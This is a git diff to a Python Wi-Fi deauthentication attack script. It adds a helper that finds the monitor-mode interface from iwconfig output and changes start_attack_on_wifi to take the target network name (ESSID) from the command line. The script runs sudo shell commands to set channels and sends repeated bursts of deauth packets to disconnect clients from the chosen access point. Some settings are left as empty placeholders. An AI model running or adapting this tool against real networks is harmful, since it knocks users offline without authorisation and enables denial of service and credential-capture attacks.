@@ -3,6 +3,7 @@
 
 import os
 import re
+import sys
 import subprocess
 
 
@@ -25,6 +26,21 @@ def start_monitor_mode(interface):
 def set_channel(interface, channel):
     command = f'sudo iwconfig {interface} channel {channel}'
     os.system(command)
+
+def get_monitor_interface(interface):
+    output = subprocess.check_output('iwconfig', shell=True)
+    output_str = output.decode("utf-8").strip()
+    output_arr = output_str.split('\n\n')
+    
+    for word in output_arr:
+        match = None
+        mon_interface = None
+        match = re.search(r'Mode:Monitor', word)
+        if match is not None:
+            mon_interface = word.split(' ')
+            mon_interface = mon_interface[0].strip()
+            return mon_interface
+
 
 
 def get_essid_bssid_channel(essid, freqency):
@@ -53,12 +69,13 @@ def get_essid_bssid_channel(essid, freqency):
 
 
 
-def start_attack_on_wifi():
+def start_attack_on_wifi(essid):
 
-    wifi_name = 'your_wifi_name'
-    frequency = '2.4' # ex: 2.4 or 5.7
-    interface = 'your_wifi_adapter_interface' # ex: wlan0
+    frequency = '' # frequency of Access Point
+    wifi_name = essid
     deauth_packets = 50
+    interface = '' # interface of wireless adapter
+    mon_interface = get_monitor_interface(interface=interface)
     
     while True:
         try:
@@ -75,4 +92,12 @@ def start_attack_on_wifi():
         
 
 if __name__ == '__main__':
-    start_attack_on_wifi()
+    
+    essid = None
+    if len(sys.argv) > 1 and str(sys.argv[1]).strip() !=  '':
+        essid = str(sys.argv[1]).strip()
+    else:
+        print('Please specify the Wifi Name (ESSID)')
+
+    if essid is not None:
+        start_attack_on_wifi(essid=essid)
